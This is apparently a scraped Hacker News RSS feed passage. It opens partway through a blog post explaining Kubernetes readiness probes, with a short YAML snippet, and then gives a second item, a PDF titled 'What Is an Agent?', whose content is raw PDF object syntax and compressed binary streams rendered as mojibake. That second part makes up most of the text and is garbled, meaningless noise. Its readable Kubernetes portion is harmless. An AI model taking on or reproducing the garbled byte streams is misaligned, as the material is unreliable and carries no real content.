  <li>We update the Deployment object with a new PodSpec</li>
  <li>The Deployment creates a new ReplicaSet for the new revision and rolls out the new pods</li>
  <li>As new pods from the new ReplicaSet enter the <code>Ready</code> state, old ones from the existing one are terminated.</li>
  <li>As soon as pods are in a Ready state, they are connected to the <code>k8s-blogpost-svc</code> Service and will get traffic directed to them.</li>
  <li>We make our <code>curl</code> calls from within the cluster and try to connect to port 8080 in our new pods, but they are still asleep waiting for their 30-second nap to end before opening the webserver socket.</li>
  <li>We get a <code>connection refused</code> error message.</li>
</ol>

<p>How do we mitigate this? If we examine the flow of events, it is easy to see that the culprit is on step 4: <em>‚ÄúAs soon as the pods are in ready state‚Äù.</em> Kubernetes thinks our app is <em>ready,</em> (because the container image has downloaded and the process started successfully), when it obviously isn‚Äôt. Surely there must be a way to make Kubernetes aware <em>when</em> it should transition a Pod‚Äôs state to Ready!</p>

<p>Luckily, when we define a deployment‚Äôs PodSpec, we can specify for each container something called a <code>readinessProbe</code>, the docs state it is a ‚ÄúPeriodic probe of container service readiness. Container will be removed from service endpoints if the probe fails‚Äù and that it is of type <a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#probe-v1-core">Probe v1 Core</a>, which  ‚Äúdescribes a health check to be performed against a container to determine whether it is alive or ready to receive traffic.‚Äù</p>

<p>The probe object is quite rich, allowing us to run arbitrary commands in the container, make HTTP requests, and more. In our example, it would be beneficial to make sure the webserver TCP socket is open before we start directing traffic at it. We could do this by changing our deployment to look like:</p>

<div><div><pre><code><span># ... </span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span># define a single container</span>
      <span>-</span> <span>name</span><span>:</span> <span>webserver</span>
        <span># using our pushed docker image</span>
        <span>image</span><span>:</span> <span>rotemtam/k8s-deployment-blogpost:slow-boot</span>
        <span>ports</span><span>:</span>
        <span># expose port 8080</span>
        <span>-</span> <span>containerPort</span><span>:</span> <span>8080</span>

        <span># wait 30s, then every 5s check if the port is ready</span>
        <span>readinessProbe</span><span>:</span>
          <span>tcpSocket</span><span>:</span>
            <span>port</span><span>:</span> <span>8080</span>
          <span>initia‚Ä¶</span></code></pre></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/">https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/</a></em></p>]]>
            </description>
            <link>https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577917</guid>
            <pubDate>Thu, 24 Sep 2020 12:28:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is an Agent? [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577896">thread link</a>) | @hardmaru
<br/>
September 24, 2020 | http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf | <a href="https://web.archive.org/web/*/http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><f2082c8253a21bcf7efdc822f55d67f3>] &gt;&gt;
stream
x≈ìcbd√†g`b`8	$Àú√ªA,c √Å¬∏√Ñ√ä\	@B¬π
D¬∞‚Äö¬∏√õÔøΩ‚ÄûFÔøΩÀÜÀú√á√Ä√Ñ¬®¬¥¬§≈ΩÔøΩq√®√ôm≈æ
endstream
endobj
                                                                                                                                                                                                                                                                                                         
18 0 obj
&lt;&lt; /Pages 37 0 R /Type /Catalog &gt;&gt;
endobj
19 0 obj
&lt;&lt; /Filter /FlateDecode /S 72 /Length 93 &gt;&gt;
stream
x≈ìc```b``≈æ√Ö√Ä√å√Ä√Äq≈íAÀÜ
√Älf ‚Äú√•∆í;√õ√è¬Ø≈ì¬π|'√úJZ√ì=‚Ç¨YxX√û√ª∆í¬¥1'X$ÔøΩÔøΩ≈∏ÔøΩA√π¬§√Ñ!√çBM-F√≠^√Å¬©e}/
endstream
endobj
20 0 obj
&lt;&lt; /Contents 21 0 R /MediaBox [ 0 0 612 792 ] /Parent 37 0 R /Resources 31 0 R /Type /Page &gt;&gt;
endobj
21 0 obj
&lt;&lt; /Filter /FlateDecode /Length 2327 &gt;&gt;
stream
x√ö‚Ä¶XKÔøΩ√£¬∏¬æ√è¬Ø0√¶¬≤2√êV$R√è\‚Äöd7‚Äπ√Ö 	‚Äör√à√§@Kl‚Ä∫=Q√™^#&gt;√µ¬¢√õ-√∂bR|U¬±X√µ√ïWN6‚Ä°M¬≤√π√ã¬ß√§w√ö//≈∏√æ√∞S≈°o√í2Vi≈æm^^7*S¬±¬™√≥M‚Äò√¶¬±¬Æ√ï√¶¬•√ù√º+√∫√ß√ë√å√õÔøΩNT√§&lt;¬∑fÔøΩ√∂`‚Ä°¬≠*¬¢√πO√õ¬ø√º‚Ä°‚Ä∫4ÔøΩ√´<wxx≈°√Öi¬π√ô¬©*¬Æ√™‚ÄùÔøΩz[a√ã√èfz√¶¬≠*¬£√≥2p∆í?p.≈ì¬≥q:√é`√ázÔøΩj√û√π√ã2x√û¬©‚Ä¢¬∞¬∏js√áu¬° ¬∂ku¬ßy¬∂√ô√©"¬Æ="" q√Ω√•h'√ò¬¶t¬Ωou√è‚Ä†‚Ä∫‚Äú9a¬ß≈†√¨$√ü√ã¬æs√õ4‚Äöuit‚Äû≈Ω√Ön‚Äπ‚Äúu√§‚Äì¬™√≤+¬±¬©√é√¢n‚Ñ¢¬∞<√ª√ï¬Ω√ög√•√†"u‚Äô‚Ä°eÔøΩ√±3√ã;¬£n√ñÀÜ√¥√ô√çÔøΩmw‚Äû:¬Æ¬µ√õ¬øÔøΩ√å¬ø]7√∫√±tt√ç6o#√ì√Å="" ‚Ä¶≈†√∂¬®<√ù¬±√†√á√Çv="">‚ÄôFh√é2N¬´LEo√Ñ¬ßÔøΩlV
{q¬£Vl&nbsp;√∑‚Ä†1√ü8;ÔøΩY√Ñ√í‚Ä†a≈ìy¬©y]√ª√π√±√Çi¬Æb
^ *√á√õ]¬¶¬æ¬®T‚ÄòY√¶√£8y√πÀú‚Äπ≈í¬≥d√¨:√Æ¬∞
2?√ô√ø.n¬≤≈æ√Ø‚Äû√ú√ú√ß√¥a¬¥JV‚Äö‚Äô√û/√Ωiv√£√†≈∏¬∂¬ª&lt;¬©¬£=¬∏M√π¬±¬∑√ú_¬±√ïh¬≠^¬∂M2√ï√ö√é√≠√ÖO√ål¬ª3√õ_M√Øx0^=√ê√ã√ÅÔøΩo√îi√∞‚Ä¶ÔøΩ¬£¬∑√É√ö ÔøΩ√ûA?&lt;7M¬£d¬°¬≤T‚Ä∞0l√Ü√æ√îY‚Äò&gt;]√£f0aQV`B√ßyag√¶√Ω5&nbsp;√ña≈ì√é√°ÀÜ√Å∆í/-¬≥*¬®T¬¨ZHk~√ªÀú√ñB√å√ñD√ówx√Üh¬ØB¬¥W¬æ}¬•*hO.nvo√§√óx\hNe%8z√ß‚Ä†/¬¶√Ä√¢
n√Ü√¶√å√£ÔøΩÀÜÀúH5√ò&lt;∆íGÔøΩr√é4¬ªoI≈°5≈Ω'/"m√ó¬πzI,≈Ω¬±r‚Ä∞/√∏√§¬∫N#G¬≠_;√ãÀú√ßv√ÇÀÜ√°E¬ΩÔøΩ√ç	\‚Ä¢√ø√á√ç√å&nbsp;‚Äö√≥‚Ä†;p‚Ä¢Q√∂‚ÄòÔøΩ√äh‚Äì√ùp√ô√É;¬∏√è‚Ç¨{L^v6√â‚ÄöF@√∞√é‚Äò√Ü¬Ω¬∑√ì‚Ä∫¬¨S‚Ä¶&amp;‚Ä°¬£NoÔøΩ_&amp;‚Äπ1¬¶RqZ√¶j:√ã √∞√Æ(&nbsp;x√π√ê√†√®√≠√ì¬∏≈Ω√°C√üy√é¬°‚Ä°√ú¬π‚Äú(&amp;h^~GW≈∏‚Ä¶ √Ñ√∞B√†d√§√©q‚Ñ¢¬∏3√ù√∞ÔøΩ=¬¶√ç≈æ≈ìc¬§√∑√Å√•GA`√º√∂ÔøΩo√≤(¬¢√ä¬∏Dc7E√ìC‚Äû√ç√æÔøΩP√ß*√ñ‚Äî¬•√§7gT¬µ(√≤√®2ÔøΩBFh¬¨¬∏¬±√ß√§√¶0√è√∫√¶¬¶q√®√•¬≠y√¢√ù√çG√ÆQ√∫¬∞∆í'ÀÜ√Éz+√™485√ã√∞√Ç¬≤F9‚Ñ¢}D¬ª5{¬π‚Ä°¬™LD.√∂,D‚Ä°¬∂√ç√å√êZ√î≈ì`u¬ß6D09‚Äπ≈Ω~^√∫‚Ä°)√ô√≤`‚Ä†ap6h√´&amp;‚Äò√ãy√ëUA≈ìBB∆í√Æ≈†√™l‚Ä†4c√§√ÉnÔøΩ√ì√Å.√´¬¥√∫X`≈°‚Ñ¢¬ß√Ö¬®i√§√°√†‚Äù‚Ä†¬¥√å¬ª√™¬®¬≥‚Ä°p@nt¬º?√¨J√É√∏H√ó≈æy√¨ÔøΩ"√®w‚Ä°‚Äù√èÀÜ¬ßX\\√¢‚Ä∞G¬ÆÔøΩ?√ó\√á√ü≈ì√°NczH≈æR@√ç≈†ei‚Ä∞¬∑‚Äù‚Ä¢|M√¨¬π0√îÔøΩ√∏≈Ω√ªu4√±√£+ÔøΩ√•;‚Äò¬•‚Ä∞√ä≈°ÔøΩ¬Ø‚Ç¨¬∫^W√á√ô@√òifs∆íD‚Ç¨√ì‚Äò√∂¬µVV√≠ÔøΩ≈ì√ß!√Ç‚Ä°¬©¬¶+N√™¬∏∆í‚Äù¬ß‚Äì¬øÔøΩ¬•‚Ç¨0√ø‚Ñ¢7cp√è √ù+/u¬´¬∏√¢!‚ÄòÔøΩh√†‚Ñ¢¬Ø‚Äû√Ä	r‚Ñ¢@A[t√∂lpÀú√ñqDG‚Äôd¬¶WÀÜ‚Ç¨qpD¬¢Y√¥¬∑√â√ú`fv<n√ªp≈æ√•√éw≈ì√¶√Æ√Ñ√∑≈†√≥√à√ÑtÔøΩ√Üeq¬°{√¶√∞5u\‚Äù¬™‚Ä°¬ÆÀút‚Äû¬π(ÔøΩ¬≤‚Äún√íxgw¬¥√ç‚Ä¶@¬©rr√æ√èoyhr√™√Ä√ß+‚Ä¢3‚Ä†{≈æ¬°ÔøΩ√ú√∞ad;√Ø√áÔøΩ¬≥√º√ßÀú¬Ω√ß¬Ø√£,√ì¬∞a=#"nÔøΩc√Ç√πs √â|√µ‚Ä∞√é~¬∂¬Ω@¬µ?≈Ωk√ó2√Ç3?db√Å]√≤∆íwÔøΩz√®u√π="" ÔøΩ√≥√õ√ú∆í¬º+kÔøΩm="" ¬≥¬∏¬Ωav√§‚Äπ)ÔøΩ≈Ωo<="" ¬®√ê≈æ‚Äπ="" √™√èa√≥m¬ºj√äh√ò¬∂¬∂}¬∏¬£√Ä¬∫y@0d√í="¬∑¬±UJ5√ë√ä#~‚Ä¶v‚ÄûL√∂√ïN+W√ã¬π5Q√¥L√®¬Æ¬∏X¬©√£D]Àú√≥D√§√ª√Ñ" ¬∞√à√ôÔøΩ√É?x]="">‚Ä¢WW|¬ªO~fi'bKg&amp;√æ≈æ√†&lt;&lt;‚Äπ,√Ç√ß‚Äò6√ü‚Äô&lt;√©√úwA{√í‚Äú‚Ä∫√ñ√ö√∑¬ª√¨√§¬≤P√∏√®√™.51√£√éaY‚Ç¨)ÀÜ¬£√©;¬≤√Æ4‚Ä∞0ÀÜ‚Äò*3√Ña≈æ≈ì¬ß¬•‚Ñ¢√Å√Ø@r√äC-P√ü	i¬µ√ß¬µ√º‚ÄûÀú9√É√æ ‚Ä∫s2{ÔøΩ√°,BQU√°≈æ¬±√¶¬∞@√≤√Å√ì
∆íK√âÔøΩ¬≠K√í¬ØB√ØePÔøΩA(V≈†&gt;¬¨Àú√´√ã√µ√∏,√ù√£‚Ä∫h√ó√µ¬•l{¬¥:%-‚Ç¨¬©[√é{¬•Q3‚Ä†‚Ä∫√¶!)‚Ä°≈æB‚Äù√Ñ¬™√äW¬≤¬¨+FB&lt;√¨r98v√òÔøΩ‚Ä¶y√£√Ä¬£¬™≈í¬æ√ã¬∫Q6
G‚Ä°¬∫Khz‚Ä¢¬Æ¬™√ù‚ÄîdD√Ñ≈°{√°8‚Äú√à¬∑0¬ª√¥¬∂¬ΩZy¬®‚Äú‚Ç¨p¬ªP√©WÀÜ‚ÄùJ¬§√Ä7√¶√§¬ºÀÜ√æc)w√°H3B&nbsp;√π@¬©Z¬æ{!WÔøΩ√∂t√§`
¬§v√≠!√ï √ª¬¥&nbsp;‚Äî√à!P&gt;¬≠√ì_<u√±\c√ñ√¨oppr¬Æq≈†-ÔøΩs!=5‚ÄùoÀú√Å4√® o√óc√π√é√∞$‚Ä¶5√•f‚Ä¶^i="ÔøΩ¬∂,‚Ä¢‚ÄûG¬∑T¬æ√ßun√Ä¬™DPn‚Ä¶√ãÔøΩOA¬≤¬•" √∫√®√í√†¬´u√µ;¬®∆í√í√¶g7¬Øt¬¨√´,l}s√∂√Ω#√ì¬¶√°="¬ø'‚Äùnw√à‚ÄûkT√ë?X√Øo‚Ä∞√í√õ¬¨T‚Äò≈†?[√üÔøΩt¬∫‚Äö√∞‚ÄùY≈†`√±$√∏,E7√ú¬¥ÀÜUY√ú">√ç‚ÄöuN√ßh√øG√Ω‚Äò‚Äò≈†al√†√∂R¬∂‚Ä¶?n3‚Äô√íq√∏‚Äπ√ø√É¬®√≤¬ª√öS√™≈ì¬∏J6√∏	Y√ì(~$ÔøΩ6‚Äú√ÉA‚Ä°¬≥√é√Ä¬≥-S√´√π‚Äú¬≤(.
¬Æ√Ø:‚Äòp‚Ñ¢w√°@√º√ª‚Äö√Æ1t¬∞z √ê√ò√ΩvA√ºQD√®¬≤≈í¬Æ√∂L&lt;2¬ª√û@!¬©[√±Àú¬™ÀÜ‚Äú√¥√≤‚Äî‚Äì¬•?‚Ä†¬¶√Är√Æ‚Ç¨0‚Äπ√ã\_%¬ßÔøΩ√ΩE*¬Æ"ÔøΩ¬∫¬≤|.‚Äû≈íF√ªNj"#≈†r&lt;√Å√ë5√†O,√ßy√º√ï√ç/√∫√±J6‚Ä†J√¢¬≤√êw√ø√ì≈í‚Äö√Å√ÅT≈æ¬ªp&amp;√ê‚ÄôS‚Ä∞√ò*d√∫√ª≈Ω√æ4‚Ç¨UHJ¬§l√íW^‚Ç¨ÀÜ¬∞ √π¬§‚ÄπW√ëO¬°Dhq√∑¬Ø√ø√Ø!u√´√®¬π)_¬Ø√û¬£3ÔøΩ]‚Äπh'¬æ√ã√ÖÔøΩ√Ü√ø¬©√êE¬¨p0√ì4√£ryb¬≠YX√∂√Ö√¨√∑√†¬£?H<c\≈∏√ßÔøΩ√ø‚Äö~‚Ç¨,k√©√û\o√ß"c√º#√™s√πy‚Äúu¬¨hc√Ñi%√ò¬¶7k~|√π√¥zw√æ√πendstream endobj="" 22="" 0="" obj="" <<="" filter="" flatedecode="" length1="" 1527="" length2="" 7958="" length3="" length="" 8982="">&gt;
stream
x√öÔøΩ¬∑4≈ìk6¬¨‚Äπ√û{0zgF'j¬Ω√ó√®∆í√Å(∆í1z‚Ä∞√û¬¢‚Äπ√û‚Ä∞D√Ø%ÀÜ√Æ√ë{%DD¬Ø&gt;√â9√Ø9√Øy√ø¬≠√Ø[¬≥√ñ√ås√≠}√≠}√Ø¬Ω√Øk?k
∆í‚Äì.ÔøΩ¬¨ÔøΩ‚Äπ√§‚Ñ¢√Å√¢≈†√§√îu@√º P‚Ç¨√§√áfa√ë∆í"≈ì ‚Ñ¢¬±Y pw¬®L√º¬ørp√±`‚Äú#x√™.0‚Ç¨≈†‚Ä°$	‚Äπ∆íD√ÑÔøΩ@?(√∂¬¢\ √∂‚Äû√ö√îy*.0ÀÜ;6‚Äπ≈ì‚Äπ¬´jgÔøΩx8√¶?ÔøΩvkHLL‚Äû√ªw8@√ñ‚Ä°Z∆íau0√Ç√¢√ºp¬¢5√ò	&nbsp;√´b
‚Ä¶ |√æ‚Ä¢‚Äö]√ÇÔøΩp√ß√£√≥√≤√≤√¢;¬ª√≥¬∫√Ä√≠¬§8¬∏^P‚Äû=@√¢ÔøΩ{Bl¬øh‚Ç¨ÔøΩ!v√Ü‚Äπ√ç√ê¬≥‚Ä°¬∫√øi√óu¬±ExÔøΩ√°√Ä∆í√Å	j
ÔøΩ¬π?Dx√Äl p√Ä√É√°]e5‚Ç¨¬¶+√∂'Y√≠O7√†¬Ø√ô@¬º&nbsp;¬ø√ì√Ω√Ω+√∂;lm√≠√¢√¨
‚Ä†√π@av[¬®&nbsp;√πLÔøΩ√°ÔøΩ√†‚Ç¨a6¬øÀÜ`'w‚Äî‚Ä°x¬∞'√™¬∂z √º¬Æx&amp;¬´
?4√∏W{√Æ√ñp¬®+√ÇÔøΩ√ó√™√¥¬´E¬æ_i¬¶¬¨¬≥‚Äòsqv‚Ä†√Ä√Æ√ò¬ø√™‚Äú‚Ä°√Ç!√ñc√∑√°√ª√≥fa.^0¬ø¬ø‚Ç¨-fc√ª¬´	W&gt;}√î√ç¬¢,√ø√•√Å‚Äû√ΩÔøΩ√ç‚ÄöÔøΩ@1A√Ñ
√±¬∂¬∂√ß√ª‚Ä¢^√è√á√≤√õ	√∫e~√® √Ä√è√ï√Ö`√ª√ê$jy√∏√Å√∂s{B¬∏$√Ä√Ø¬ø√øF√ò √ÄjÔøΩXA√¨&nbsp;0√¨¬≤?Àú!¬∂√¢‚Ä°√ã‚Ä°C¬Ω&amp;√Ä√≠ÔøΩ√Ä_≈∏¬ø≈∏√å√§e√£s√≤√π‚Ä°√æ√ª~√π≈íu‚Äù√§ÔøΩ¬π√æ√¨√∏o√ü√ì¬ß.√û?A¬ø &amp;*
√æÔøΩE√Ω¬´
√†?¬°√ä0[‚Ç¨√ò≈∏√Ö&gt;L√©?{√æu√ø√¨√≠√†√ü¬π4\D¬∞√ø¬£qS&nbsp;√ê√∫√°√¥√ø¬¨√¥√ü!√ø√ø‚Ä¢√•√ø¬¶√±√ø-√®‚Ñ¢‚Ä°‚Äú√ìo7√ªo√ø√ø√á
v‚Ä†:√π√ºEx√ê¬¨√¢A√ø√™.[√ª_¬™!√§√èÔøΩU‚Ä°√ò@=≈ì√ø√ó¬´≈í?√¨ÔøΩ,√å√é√©√Ø1B√ù≈∏A¬Ω!6ZP‚Äû¬µ√Ω≈∏b√π√ì¬Æ√øk√â≈ì&nbsp;0ÀÜ‚Äì‚Äπ;√¥√ó[√Ä√ø√á√∑¬∞Y√ñ≈Ωo√∑E√ævA√ß√üG*√Ä¬¨]l~m¬øÔøΩ0‚Ä°∆í}¬∞ÔøΩB√¢√∏ÔøΩV√ë√¢√Ω[√É&gt;^Àú√¢!√∞√ê^√Ä√ñ≈Ω√Ω√´F‚Ä¶‚Ä¶|¬≤¬øL¬ø‚Äò?‚Ç¨O√©$√†S√π‚Ä∞‚Ä∞√∏√Ä#√ê∆í√π √ø@√Ä√ª/√∏
√ø/(√†C√º
z√°Cx¬π√º‚Äî√ª!¬µ√á?ÔøΩ√ø!¬µ√è√üPP√Ä√ßÔøΩ√øI√øW√Ø√ñp√∏√É√∂√øV√ß√É`√æ∆í¬øj oÀÜ5√∂√¢≈ì‚Äπ√µ‚Äú0‚Ä°√∫¬∞√é¬´ZY/≈æ√≠‚Äô√ì,√õ‚Ä†&lt;~‚Äπ√∞.ÔøΩ|√åT≈Ω≈°≈ìÔøΩ5√∏‚Ä¶l√™√à{√Ç‚Ä¢M√∂s‚Ñ¢%√∫≈∏~√ªmÔøΩÀú‚Äò√≠)√ö?√ºo-‚Äôt&amp;¬∑;¬∞&gt;‚ÄôN¬º√û‚Äîm&nbsp;√Öz√å¬£'¬≥√£√ø√ì√ç√ü √ò¬µ
¬π[‚Ä¶¬•√Ä√çC_¬´ÀÜ√§√ä¬´_√ë¬ªa&nbsp;by,bn[{¬ßFX√ß¬∂b≈†'N?√ñ4¬∏l‚Ä†¬•√ê*w‚Äì‚Äô√ÅC√ªÀÜ‚Äú√∏√à‚Ä∫`√¶√ºb≈°8√¢≈æ^%‚Ä∞;√†[≈ì@‚Ä∞≈∏√±:√º√µ¬¨√Øj‚Ä¢¬ø{3‚Ä¢1%-√™9√±√ò$¬´√ü√ì√ù4≈†y¬ø√≤‚Äô5√∏X√∫,y√ó√∏‚Ä†√≥+ÔøΩ√ì.¬ª√Ø¬∂‚Ä†√é|√Ø√Ñ≈ì‚Ä¢eB≈ìÔøΩ≈†‚Äô‚Ä¢T√πe√¨Z¬ªR¬≤sC2‚Ä†`√Æ√ë≈†√ä≈°¬∑√≤‚Ä∞H‚Ä∫‚Ä¢;¬∑f2√¥^√ìI¬§AHGl¬ª√∑&amp;¬ø√Åw‚ÄúÔøΩ¬¨√ûÀÜ3R√á≈æ,¬µÔøΩ√ñ'I‚Äπ≈ì√ü√Ä≈†U¬ºm7tG√±√ât√àzut‚Ä¢¬¥¬©U√üRÔøΩ¬∂¬≠+√®¬≥]N¬ΩW√∞√û¬™√É√à≈†√∑¬∞√≤√å¬±≈†√ØT‚Äù√ß√û&amp;¬ß√©√ë‚Ñ¢u¬∂√ã`√∑√é¬∏¬ªÔøΩ3‚Ä¢9r*KSSÀÜ√§nm{j¬æ&lt;√çK√≤‚Ä†\ZÔøΩ¬±6t√™8¬¶√î≈ì¬¨‚Äö6ÔøΩ&amp;-≈ì!¬≥√∫√≠}≈Ω√¨≈°√ù≈Ω/√¨¬´¬®ÔøΩ¬Ø‚Ä∫¬§√∫√∑¬≤5oDsÀÜ^c)a&amp;√Ñ_¬∑&nbsp;Dn≈í{ÔøΩ+~√ú‚Äî√øD¬π¬°√áQtj√∏√∂√Ω√©√∏¬ª√ìC¬≥b&nbsp;o‚Ä¶ÔøΩ√ÆS\
¬ßW$√Üy≈°‚Ä∞j‚Ä°√ì‚Ä¶√±B4√¶bÔøΩ}¬§w√¢e¬™√≠≈ì√®√æ√ü≈∏a‚Ä°‚Äû√ù√ª√µE‚Äì"∆í*√¶¬∏√ó¬®√≤~¬∏u¬¢PHu9√ç√ì¬Ω√∑√ì√™¬µ√Æ√ò≈í√∫√∂^√¨‚Ä¶GwB¬©pG≈æP√πÔøΩhÔøΩ#Z√ë6‚ÄπP√à¬•√Æ√´V\¬ø√êÔøΩ‚Äöu
j‚Äò‚Ä†√ÑK{&gt;U‚Ç¨Om‚Ç¨√∂√Ω√≥~/^H8c√å√≤{≈í√•¬ß√ùDÔøΩ‚Ä¶√õ	
¬¢‚Ä†¬§
"a_‚Ä°&gt;¬¶S¬±≈†
≈ì88ÔøΩ√°ÔøΩ√êÔøΩ¬§√Ñ¬∑√©¬ÆDQ√©C≈°¬£P¬£s√£|y√û√çB¬æ)√°√Ö*p&gt;5√óÔøΩ√∑,n≈Ω√ç#√å√°U√¨o√î‚Ä¶uz~ÔøΩL√Æ;ÔøΩ√Ω∆í7W√∑e≈†√∫=G√Ñ¬≤√ÑHK√¨w√è≈∏Z√ì√∂AL e&amp;M‚Äπm√∑√ï√ó√Ω√É√è.√≠<j√ª6√à¬≠√ñ‚Äì¬πw√∑)√â‚Ä¶g?√∞√≤ÔøΩ¬µ*9¬º√ôn6x√π‚Ä¶√Ω,]m√ß√¨ ¬¢).'n="" 1√£¬†h?√≠≈Ωi√ï+'l;40¬´n√±ÔøΩ√©√™¬§="" ¬≤√ä¬ß(¬º¬ß¬≤ÔøΩ="" √ü¬≠i\¬°¬•¬£¬™¬∏¬Ω‚Ñ¢{√©"+√Ø¬•¬µ3x√â¬≥q√∫ÔøΩ√ªg8√í√Ø^sqg;k√∑¬≥‚ÄòÀÜ="" o,(‚Äπ`ÔøΩe¬∑√ô√§sp&√©ÔøΩ‚Ç¨√Ö√á¬£¬≠y√ó\_'lv√ç≈æ√Æ¬•‚Äòn√°i%√õ‚Ä¢ÔøΩ}≈°ek√´'√ç¬∑z*,1√é√Ö√à¬≥‚Äûx√∑¬†¬©\¬°¬±√Øt√ê¬Ωkp√Ö{‚Äπwv&≈∏√®|‚Ñ¢¬∞√ö¬¨√π¬∏‚Ä°√òs√í¬ø!√≥e¬®0c‚Äπ‚Äûk√øÔøΩ√¶¬¥¬•_¬ª√≤o≈ì¬ΩÀúd="" r8s√¨√¨‚Äìa√Ø√Ä%‚Äö9f√∫√Æb‚Äìb≈†5="" ¬§√∫="">m¬™√§√Ö6√à√¶s√§}√à¬®≈í4√©√á√Ç√®¬®"√ç¬¢√ïÔøΩ√Æ‚Äú√º‚Ä∞√ÆsG)tN√¶√∫√™¬®U'_√ø¬≤√µ‚Äû‚Äûu√ò√ô^N‚Äô√Ç‚Äì√Ü¬≥≈æ√Ω¬¶^‚Äù$u¬°|/√´√ç9V√å¬º√Å¬∞bG¬Ø∆íJ¬©¬§‚Äπ√¥¬∏√≤‚Ä∞N¬Ø√íÔøΩ√æz√ê7i¬ß√í8√µ√Ö¬™I~;√ç√ùe^√íp¬Ω~‚Äò√ä‚Ä∫f¬Ø‚Ä∞‚Äù√ím¬®%rÔøΩ√ñ
√í¬¨HE√å?;f√ß¬Ω9WyReÔøΩ‚Ä°¬≠√ë√≥≈†√≥o1N√±qO√©√´√µE√ø√¨√§‚Ñ¢&gt;¬∫(√Ω√ó√∑√ñ√£√ïkE¬ª√∏#√•N3/6R‚Äû¬ß√¨¬≥‚Äû√ëM¬∞√∏√ó≈°&gt;√¶'√í√ë¬Ø{√™≈∏e}v√™√î√≤g√°0j√Öw&gt;j≈∏¬Ø√å¬•%&amp;‚Äìd√≠c¬©"?S‚Ä∞√Øs√è¬≥&nbsp;-¬´O√éD√∑‚Ä∞¬±H√≠√Ø¬ßR'√ú√üÀú7≈°√æ4=A√ÑA√π‚Äô3Àú"2h8∆í?ÔøΩ√∫gÀú4√∫¬∂≈í√∑&gt;CFDG√¶‚Ä∞√¨¬´ {√≤√£N^I√§√Ø‚Ç¨qz√ã¬º){6√ó¬™¬©M.√ØT√èq¬£‚Ç¨ÀÜz√©‚ÄîcD≈†sD√≤¬¥√¢√©!√¶√ç	M‚Ä¶√ì√π‚Ä∞≈ì¬¨m‚Äö√á¬Æ√∞√è√ûq¬∑BT¬∫‚Äös{‚ÄölG‚Ñ¢c]‚Äπ¬±√∏mz9'ss≈í¬±‚Ç¨¬•f71‚Ñ¢√∂√â5√à√Ω',‚Ñ¢¬∫≈Ω¬ªR√å‚Äö√ø/√µx≈†5¬©√ò≈°√ªV≈æ‚Äû¬£hf√ç‚Äú√î
‚Äò!%¬æ‚Äù√¢√ÅtÔøΩ%%√ä¬°wo¬ß∆í0√¶¬∂√µ‚Ä∫√à√¶¬π≈∏=√∂√ß\	ÔøΩ
C%¬©≈†√ìo¬ªF√£S‚Ä†j√®√¢~4a`}‚ÄπN‚Äô√∏x{‚Ç¨√π‚Ä¶√ø√¨¬•3≈†‚Äù^√ó‚Äûc√≠√Ü¬£=¬∏Gx√≠suXL‚Äπ√áCKijmQ√ö3/E;√ö&nbsp;¬ª'ÔøΩ86%¬≠+N¬£.X√£√îm√º?qS√¥7N√è=z‚Äû?g√à√ç¬Ωd¬°x¬Æw√é¬¶s;D√≠0‚Ä¶‚Äù√Ø2¬¢U¬Ø‚Ç¨¬®√ù%p!¬•ÀÜk√û5√±ÔøΩY^√ä‚Äû~‚Ñ¢√é≈∏≈Ω√ü&amp;C"lÔøΩo¬¨T√Å√Ü{≈†√ªrlÀú¬π√≤9x¬∂V‚Ä∞K6√©‚Ä¶ÔøΩ\Y√ª√ï¬©√Ñ¬ß'√©?&lt;√Ω%‚Äû1g¬∑dqnF¬±R#	¬Æ√äoYj√ô√©≈í√é<sgwd@ÔøΩb√àn‚Ä¢¬≤5¬™k√ïa√à√¥√Ç%dÔøΩ√í√í√årz ¬π¬≤n√ñ√´≈ì‚Äô√é,‚Äû√ân√ô√í¬®√∂?="" ¬¨x:r√™√°6¬≥w¬ø1√ã√´#√íy√†1√©ewx√ªmv‚Ä¶a√Ä]√Ç)[√¥u¬•x="" √ù√∏¬Æbx√Å¬Ωqc2√ñ¬π√ë√∫c√Ö1="" √Ø√≤¬µn√§√ª¬®√©‚Äú)√≠√Æh√ñ6≈°¬¥!√Ø√™√≠√Ω¬±6_x~wt‚Äû¬£\y¬≠¬≠‚Ä∫!√èb√™√èpa¬∑hl√é="" w.√û;'√£8ÔøΩ="‚Äö&amp;√°∆í¬¥‚Ç¨8" b√±x√ë‚Ä°‚Ä¢√¶y&∆í‚Äî√Ñ‚Ä¶√Ω!√æam√á3^√µi|?√ä7o¬≤dÔøΩ¬∞¬´√§ji√è~‚Äô√ß¬∏t√í7kh‚ÄûyÀú¬øe√øh‚Äù√Ä√±!√æ√ä√§jp9q‚Äπ="" ¬£="s¬®√•√ï√õJ√ÖA:ÔøΩ¬§√úe¬≠$≈†√ù≈æ√â√∑¬≠√àUt‚Ä∞√´‚Ä∫a4¬ßx{¬§C√∏≈°√Ñ;√í√üÀú√Å|‚Ç¨√†ÔøΩ‚Äîx√û¬∂n√™√ªH√î√π">'NPÔøΩ‚Ä†√è¬™Z√£√æu√¶¬™√™√≤{ÔøΩ√≠.¬¢√£‚Äú¬Ω¬∫√†JM√ª	√ô¬°√å¬¨‚Ä†N)√≥2b1√è√º√©DNL6egD√´t¬µ¬∏ÔøΩ√ìazH√±+¬µi≈°¬∞≈ΩwAC√∏¬≠
C‚Äî√≤¬´√¨QYM≈ì√á√Å√ù[b;¬∫√ï√≤6$≈Ω}√î√âV√å¬µ7√áC√¶ÀÜ4√Å{!H√í'%ÔøΩ(x¬ø√í[√•n√çLa¬∂√µ¬™ÔøΩ	"¬ß¬¢√∫ÀÜl√¨¬∞√ª
